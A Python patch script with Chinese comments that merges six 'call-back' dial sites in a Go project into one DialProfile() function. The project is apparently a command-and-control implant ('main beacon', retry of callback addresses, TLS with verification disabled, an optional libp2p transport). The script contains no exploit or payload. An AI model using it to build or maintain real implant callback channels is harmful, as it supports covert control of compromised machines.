#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Phase5 §4 步骤 2（**纯 seam**）：把 6 个回连点的拨号逻辑收进 DialProfile()。

    python3 patches/seam_transport.py check    # 只校验锚点与签名，不写盘
    python3 patches/seam_transport.py apply    # 落盘（先备份 .bak-seam）
    python3 patches/seam_transport.py verify   # 回读目标态
    python3 patches/seam_transport.py revert   # 从 .bak-seam 反解回改造前

★★ **没有 git：本脚本 + .bak-seam 就是唯一的回滚手段**，所以 REVERT 段与 APPLY 段写在一起。
★ 没有 .bak-seam 时 revert **拒绝执行**（不许"看起来成功了其实什么都没动"）。

设计要点（每条都对应一个踩过的坑，见 doc/问题归档.md）：
  * **按行号 + 内容签名定位**，不用全局 replace_all —— 6 个站点里只有 1/2 逐字相同，
    3 比 1 多一行 procCancel()，4/5 的收尾根本不同。
  * **自下而上**做行区间拼接 ⇒ 行号在过程中始终有效。这就是"同一文件多处替换必须
    **串行累积**"的正确形态（对照那次"各自基于原盘算串、后一处覆盖前一处却仍报 8/8 成功"）。
  * 替换单元 = `if profile.UseSSL {` 起的**整个拨号块**，**不含块外收尾** —— 窗口带多了
    会把上下文差异误算成目标差异，带少了会撕开结构（归档两次教训的正反面）。
  * `srvConn.Close()` 全文件出现 7 次 ⇒ 站点 4 的 nil 判断**只能用行号**定位。
"""
import os
import shutil
import sys

HERE = os.path.dirname(os.path.abspath(__file__))
SRC = os.path.join(os.path.dirname(HERE), "src_gopher")
BAK = ".bak-seam"

DIAL_CONN = "\tconn, err = DialProfile(profile, profile.Addresses[0])\n"
DIAL_SRVCONN = "\t\tsrvConn, err = DialProfile(profile, profile.Addresses[0])\n"
DIAL_MAIN = "\t\tconn, err = DialProfile(profile, profile.Addresses[addrIndex])\n"

# 站点 4 收尾：原样是 `srvConn.Close(); return`。加 nil 判断是**必需**的：
# 拨号失败时 srvConn 是 nil 接口，`nil.Close()` = panic（既存缺陷，见 §5）。
TAIL4_NEW = [
    "\t\tif err != nil {\n",
    "\t\t\tif srvConn != nil {\n",
    "\t\t\t\tsrvConn.Close()\n",
    "\t\t\t}\n",
    "\t\t\treturn\n",
    "\t\t}\n",
]
TAIL4_OLD = [
    "\t\tif err != nil {\n",
    "\t\t\tsrvConn.Close()\n",
    "\t\t\treturn\n",
    "\t\t}\n",
]

# (文件, 起始行, 结束行, 必含标记, 新文本, 备注)  —— 同一文件内**必须按行号降序**
OPS = [
    ("tasks.go", 1438, 1456, ["tls.X509KeyPair", "tls.Dial", 'net.Dial("tcp", profile.Addresses['], DIAL_SRVCONN, "站点5 dial（缩进3 / srvConn）"),
    ("tasks.go", 1312, 1315, ["srvConn.Close()"], TAIL4_NEW, "站点4 收尾加 nil 判断"),
    ("tasks.go", 1293, 1311, ["tls.X509KeyPair", "tls.Dial", 'net.Dial("tcp", profile.Addresses['], DIAL_SRVCONN, "站点4 dial（缩进3 / srvConn）"),
    ("tasks.go", 1015, 1034, ["tls.X509KeyPair", "tls.Dial", "procCancel()"], DIAL_CONN, "站点3 dial（多一行 procCancel）"),
    ("tasks.go", 875, 893, ["tls.X509KeyPair", "tls.Dial", 'net.Dial("tcp", profile.Addresses['], DIAL_CONN, "站点2 dial"),
    ("tasks.go", 649, 667, ["tls.X509KeyPair", "tls.Dial", 'net.Dial("tcp", profile.Addresses['], DIAL_CONN, "站点1 dial"),
    ("tasks.go", 9, 10, ['"crypto/tls"', '"crypto/x509"'], [], "删孤儿 import（替换后两文件再无 tls./x509. 用途）"),
    ("main.go", 157, 175, ["tls.X509KeyPair", "tls.Dial", "profile.Addresses[addrIndex]"], DIAL_MAIN, "站点6 dial（main beacon，重试下一地址）"),
    ("main.go", 5, 6, ['"crypto/tls"', '"crypto/x509"'], [], "删孤儿 import"),
]

TRANSPORT_GO = '''package main

import (
	"crypto/tls"
	"crypto/x509"
	"net"

	"gopher/utils"
)

// DialProfile 把改造前散在 6 处的回连拨号逻辑收成一处，**逐点行为等价**：
//
//	UseSSL == false → 裸 TCP
//	UseSSL == true  → TLS（自签 CA + 客户端证书）。`InsecureSkipVerify: true` 是
//	                  原样搬过来的，不是笔误 —— 对端是自签证书，链校验本来就不成立。
//
// ★ 证书加载失败与拨号失败**合并**成一个 error，且不影响等价性（6 个点逐个核过）：
//   - 站点 1/2/3：两条失败路径在原代码里走的就是同一个收尾（站点 3 两条都调 procCancel）；
//   - 站点 4/5：原代码里证书失败是**裸 return**（不 Close，因为连接还没建立）。合并后
//     调用点先做 nil 判断 ⇒ 证书失败时 conn 为 nil ⇒ 跳过 Close ⇒ 与原样一致。
//     ★ 顺带修掉 `net.Dial` 失败时对 **nil 接口**调 Close() 的 panic（tasks.go 原 1313）；
//   - 站点 6（main.go）：两条路径都是 `continue`，重试下一个地址。
//
// 返回的 error 非 nil 时，conn 必为 nil。
//
// ★ 传输分派（Phase5 §4 步骤 4）：`Transport == "libp2p"` 时走 dialLibp2p，
//
//	它由 build tag 决定是**真实现**还是**替身**（见 transport_libp2p.go /
//	transport_nolibp2p.go，以及 §4.2 的决策）。`Transport == ""`（旧 profile）⇒ TCP，
//	与改造前逐字相同。
//	★ libp2p 分支**不套 TLS**：Noise 已经提供了加密与对端认证，再叠一层 TLS 只会
//	  增加握手延迟和签名面，不增加任何安全性。该分支下 profile.UseSSL 被忽略。
func DialProfile(profile utils.Profile, addr string) (net.Conn, error) {
	if profile.Transport == "libp2p" {
		return dialLibp2p(profile, addr)
	}
	if !profile.UseSSL {
		return net.Dial("tcp", addr)
	}

	cert, err := tls.X509KeyPair(profile.SslCert, profile.SslKey)
	if err != nil {
		return nil, err
	}

	caCertPool := x509.NewCertPool()
	caCertPool.AppendCertsFromPEM(profile.CaCert)

	config := &tls.Config{
		Certificates:       []tls.Certificate{cert},
		RootCAs:            caCertPool,
		InsecureSkipVerify: true,
	}
	return tls.Dial("tcp", addr, config)
}
'''


def readlines(path):
    with open(path, "r", encoding="utf-8") as f:
        return f.readlines()


def check_op(lines, op):
    """校验签名。返回 (ok, msg)。"""
    fn, a, b, marks, new, note = op
    if a < 1 or b > len(lines) or a > b:
        return False, "行范围越界（文件 %d 行）" % len(lines)
    blk = "".join(lines[a - 1:b])
    for m in marks:
        if m not in blk:
            return False, "签名缺失 %r" % m
    # ★ 只有"拨号单元"（新文本就是那句 DialProfile 调用）才按块头/闭合 `}` 校验；
    #   站点 4 的收尾替换与非空的 new 同形，但它以 `if err != nil {` 开头 ⇒ 必须靠
    #   `"DialProfile" in new[0]` 区分，否则那条判据**必然红**（同族：判据自己算错）。
    if new and "DialProfile" in new[0]:
        if lines[a - 1].strip() != "if profile.UseSSL {":
            return False, "首行不是 if profile.UseSSL {（实测 %r）" % lines[a - 1].strip()
        if lines[b - 1].strip() != "}":
            return False, "末行不是 `}`（实测 %r）" % lines[b - 1].strip()
    elif not new:  # import 删除（唯一的"新文本为空"的 op）
        got = [lines[a - 1].strip(), lines[b - 1].strip()]
        if got != ['"crypto/tls"', '"crypto/x509"']:
            return False, "import 两行实测为 %r" % (got,)
    return True, note


def splice(lines, op, reverse=False):
    fn, a, b, marks, new, note = op
    if reverse:
        old = TAIL4_OLD if new is TAIL4_NEW else None
        if old is None:
            return lines  # 由 .bak-seam 兜底恢复，这里不动
    lines[a - 1:b] = new
    return lines


def main():
    mode = sys.argv[1] if len(sys.argv) > 1 else "check"
    files = sorted({op[0] for op in OPS})
    paths = {f: os.path.join(SRC, f) for f in files}
    for p in paths.values():
        if not os.path.exists(p):
            print("[BAD ] 找不到 %s" % p)
            return 2

    if mode == "check":
        bad = 0
        for f in files:
            lines = readlines(paths[f])
            prev = 10 ** 9
            for op in [o for o in OPS if o[0] == f]:
                ok, msg = check_op(lines, op)
                print("[%s] %-9s L%-5d-L%-5d %s" % ("ok  " if ok else "BAD ", f, op[1], op[2], msg))
                bad += 0 if ok else 1
                if op[1] >= prev:
                    print("[BAD ] %s 的行号不是降序（%d 在 %d 之后）" % (f, op[1], prev))
                    bad += 1
                prev = op[1]
        print("\ncheck: %d 个锚点有误" % bad)
        return 0 if bad == 0 else 1

    if mode == "apply":
        # 先整体 check，任何一处不过就**一个字节都不写**
        for f in files:
            lines = readlines(paths[f])
            for op in [o for o in OPS if o[0] == f]:
                ok, msg = check_op(lines, op)
                if not ok:
                    print("[BAD ] %s L%d: %s —— 拒绝落盘" % (f, op[1], msg))
                    return 1
        for f in files:
            shutil.copy2(paths[f], paths[f] + BAK)
            lines = readlines(paths[f])
            for op in [o for o in OPS if o[0] == f]:
                splice(lines, op)
            with open(paths[f], "w", encoding="utf-8") as fh:
                fh.writelines(lines)
            print("[ok  ] %s 已改（备份 %s）" % (f, os.path.basename(paths[f]) + BAK))
        tp = os.path.join(SRC, "transport.go")
        with open(tp, "w", encoding="utf-8") as fh:
            fh.write(TRANSPORT_GO)
        print("[ok  ] 新建 %s" % tp)
        return verify()

    if mode == "revert":
        for f in files:
            if not os.path.exists(paths[f] + BAK):
                print("[BAD ] 缺 %s.bak-seam —— 拒绝 revert（不许假装成功）" % f)
                return 1
        for f in files:
            shutil.move(paths[f] + BAK, paths[f])
            print("[ok  ] %s 已还原" % f)
        tp = os.path.join(SRC, "transport.go")
        if os.path.exists(tp):
            os.remove(tp)
            print("[ok  ] 已删 transport.go")
        return 0

    if mode == "verify":
        return verify()

    print("用法: %s check|apply|verify|revert" % sys.argv[0])
    return 2


def verify():
    """回读目标态 —— 不能只信补丁自己的 [ok] 计数。"""
    bad = 0
    for f in ("tasks.go", "main.go"):
        p = os.path.join(SRC, f)
        if not os.path.exists(p):
            continue
        txt = open(p, encoding="utf-8").read()
        n_tls = txt.count('"crypto/tls"') + txt.count('"crypto/x509"')
        n_dp = txt.count("DialProfile(profile, profile.Addresses[")
        print("[%s] %-9s DialProfile 调用=%d  残留 crypto/tls|x509 import=%d"
              % ("ok  " if n_tls == 0 else "BAD ", f, n_dp, n_tls))
        bad += 1 if n_tls else 0
    txt_all = open(os.path.join(SRC, "tasks.go"), encoding="utf-8").read() + \
        open(os.path.join(SRC, "main.go"), encoding="utf-8").read()
    n = txt_all.count("DialProfile(profile, profile.Addresses[")
    print("[%s] 全树 DialProfile 调用 = %d（应为 6）" % ("ok  " if n == 6 else "BAD ", n))
    bad += 0 if n == 6 else 1
    tp = os.path.join(SRC, "transport.go")
    print("[%s] transport.go %s" % ("ok  " if os.path.exists(tp) else "BAD ",
                                    "存在" if os.path.exists(tp) else "缺失"))
    bad += 0 if os.path.exists(tp) else 1
    print("\nverify: %d 项不符" % bad)
    return 0 if bad == 0 else 1


if __name__ == "__main__":
    sys.exit(main())
